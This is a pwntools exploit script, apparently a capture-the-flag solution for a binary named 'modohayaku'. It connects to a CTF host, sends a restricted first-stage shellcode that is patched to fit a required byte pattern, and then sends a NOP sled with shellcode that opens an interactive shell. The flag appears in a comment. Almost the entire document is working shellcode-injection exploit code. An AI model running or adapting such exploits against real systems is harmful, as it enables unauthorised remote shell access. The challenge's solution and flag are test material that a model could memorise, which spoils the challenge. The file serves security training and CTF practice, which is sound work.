#!/usr/bin/env python3

from pwn import *
import sys
from typing import Union

binary = ELF("./modohayaku_patched")

context.binary = binary
context.terminal = ["tmux", "splitw", "-h", "-e", "GDB=pwndbg"]
context.arch = 'amd64'

def one_gadget(filename: str) -> list:
    return [int(i) for i in
            __import__('subprocess').check_output(['one_gadget', '--raw', filename]).decode().split(' ')]


GDB_SCRIPT = '''
# b *main+405
# b *main+466
b *main+617
'''.strip()


def conn() -> Union[process, remote]:
    io = None
    for arg in sys.argv[1:]:
        # ./solve <any option> d
        if arg == 'd':
            context.log_level = 'debug'
        # ./solve l
        if arg == 'l':
            io = process([binary.path])
        # ./solve g
        elif arg == 'g':
            io = gdb.debug([binary.path], gdbscript=GDB_SCRIPT)
    # $ ./solve
    if io is None:
        io = remote("ctf.adl.tw", 10002)
    return io

def fix(payload):
    payload = list(payload)
    print(payload)
    edx = 0
    for edx in range(0x10):
        # mov     eax, edx
        # shl     eax, 2
        # add     eax, edx
        # add     eax, eax
        # add     eax, edx
        eax = edx
        eax = eax << 2
        eax = eax + edx
        eax = eax + eax
        eax = eax + edx
        print(eax)
        payload[eax] = 0xc
        payload[eax + 1] = 0x87
        payload[eax + 2] = 0x63

    return bytes(payload)


def main():
    io = conn()

    # every 11 bytes starts with `\x0c\x87\x63`
    payload = b"\x0c\x87\x63\xd1" # mov al, 0x87; movsxd edx, ecx
    payload += asm(
        '''
        xor al, al
        syscall
        '''
    )

    nop_sled_len = len(payload)
    info(f"payload len: {nop_sled_len}")
    payload = payload.ljust(0xb0, b'\x00')
    payload = fix(payload)
    io.send(payload)
    payload = b"\x90" * nop_sled_len
    payload += asm(shellcraft.sh())
    io.send(payload)
    io.interactive() # ADL{574r8ur57_57r34m!!!https://youtu.be/jUuknk81n2w}


if __name__ == "__main__":
    main()
